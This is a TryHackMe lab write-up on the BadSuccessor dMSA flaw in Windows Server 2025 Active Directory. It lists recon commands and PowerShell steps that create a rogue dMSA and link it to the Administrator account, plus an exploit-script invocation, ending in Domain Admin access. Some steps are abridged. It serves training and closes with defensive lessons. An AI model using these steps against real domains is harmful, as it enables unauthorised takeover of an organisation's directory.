# 🏆 AD: BadSuccessor

| Field | Details |
|---|---|
| **Platform** | TryHackMe |
| **Room** | [AD: BadSuccessor](https://tryhackme.com/room/adbadsuccessor) |
| **Difficulty** | 🟡 Medium |
| **Category** | Active Directory |
| **OS** | Windows |
| **Tools** | BloodHound, PowerView, Impacket |
| **CVE** | CVE-2025-29810 — dMSA BadSuccessor |

---

## 🎯 Objective

Exploit the BadSuccessor vulnerability — abusing delegated Managed Service Account (dMSA) successor relationships to escalate privileges in Active Directory.

---

## 📖 Vulnerability Overview

BadSuccessor (CVE-2025-29810) abuses a design flaw in Windows Server 2025 delegated Managed Service Accounts (dMSAs). When a dMSA is created with a `msDS-ManagedAccountPrecededByLink` attribute pointing to a target account, the KDC grants the dMSA all of the target account's privileges — including Domain Admin privileges — without requiring the target account's credentials.

**Any domain user with CreateChild rights over an OU can exploit this.**

---

## 🔍 Reconnaissance

```bash
nmap -sC -sV -p 88,389,445,636,3268,5985 TARGET_IP
```

Running BloodHound to identify attack path:
```bash
bloodhound-python -u user -p password -ns TARGET_IP -d domain.local -c all
```

**BloodHound query:** Find users with CreateChild on any OU → CreateChild can be exploited to create dMSA accounts.

---

## 💥 Exploitation

```powershell
# Step 1 — Create a new dMSA in an OU where we have CreateChild
New-ADServiceAccount -Name "evilDMSA" -DNSHostName "evildmsa.domain.local" \
  -Path "OU=Target,DC=domain,DC=local" \
  -PrincipalsAllowedToRetrieveManagedPassword "Domain Computers"

# Step 2 — Set the predecessor link to Domain Admin account
Set-ADServiceAccount -Identity "evilDMSA" \
  -Replace @{"msDS-ManagedAccountPrecededByLink" = "CN=Administrator,CN=Users,DC=domain,DC=local"}

# Step 3 — Retrieve the dMSA password (grants DA privileges)
# Use Impacket or Rubeus to request TGT as the dMSA
```

Using Python exploit:
```bash
python3 badsuccessor.py -dc-ip TARGET_IP domain.local/user:password
```

**Domain Admin access achieved.**

---

## 📚 Lessons Learned

- BadSuccessor is a Windows Server 2025-specific vulnerability — patch KB updates immediately
- CreateChild rights on OUs should be carefully audited — least privilege applies to AD permissions too
- dMSA accounts should be monitored for unexpected predecessor link modifications
- BloodHound custom queries can find CreateChild edges that default queries miss

---
*by OwlRC 🦉 | github.com/OwlRC*
